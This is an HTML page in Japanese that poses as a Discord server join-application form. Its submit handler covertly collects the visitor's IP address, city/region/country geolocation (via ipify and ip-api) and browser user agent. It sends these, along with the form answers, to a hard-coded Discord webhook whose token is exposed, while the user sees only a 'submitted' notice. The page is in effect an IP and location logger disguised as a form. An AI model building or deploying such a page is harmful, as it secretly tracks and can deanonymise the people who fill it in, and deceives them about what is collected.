<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>Discord参加申請</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f9;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background-color: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 500px;
    }

    h1 {
      text-align: center;
      color: #2c3e50;
    }

    input[type="text"], textarea {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }

    textarea {
      height: 150px;
      resize: vertical;
    }

    button {
      background-color: #3498db;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      cursor: pointer;
      width: 100%;
      font-size: 16px;
    }

    button:hover {
      background-color: #2980b9;
    }

    .alert {
      text-align: center;
      margin-top: 20px;
      padding: 10px;
      background-color: #2ecc71;
      color: white;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Discordサーバー参加申請フォーム</h1>
    <form id="applyForm">
      <input type="text" name="username" placeholder="あなたのDiscord名" required><br>
      <textarea name="reason" placeholder="参加理由" required></textarea><br>
      <button type="submit">送信</button>
    </form>
    <div class="alert" id="alert" style="display: none;">申請を送信しました！</div>
  </div>

  <script>
    document.getElementById('applyForm').addEventListener('submit', async function (e) {
      e.preventDefault();

      const formData = new FormData(e.target);
      const username = formData.get('username');
      const reason = formData.get('reason');

      // デバイス情報取得
      const deviceInfo = navigator.userAgent;

      // IPアドレスと位置情報取得
      const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
      const locationData = await fetch(`http://ip-api.com/json/${ipData.ip}`).then(res => res.json());

      // Webhookへ送信
      fetch('https://discord.com/api/webhooks/1362686432870924372/S8va6w9Ro_W0BD9B9rTYrBCGgsXH20A6WTZCiSA-SmQ928zpdvxb8qkNuZvGxCVorrbr', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: '**新しい申請があります**',
          embeds: [{
            title: '申請情報',
            fields: [
              { name: 'ユーザー名', value: username },
              { name: '参加理由', value: reason },
              { name: 'IPアドレス', value: ipData.ip },
              { name: '場所', value: `${locationData.city}, ${locationData.region}, ${locationData.country}` },
              { name: 'デバイス情報', value: deviceInfo }
            ],
            color: 0x3498db
          }]
        })
      });

      // 申請送信後にアラート表示
      const alertBox = document.getElementById('alert');
      alertBox.style.display = 'block';
      setTimeout(() => alertBox.style.display = 'none', 3000); // 3秒後に非表示
    });
  </script>
</body>
</html>
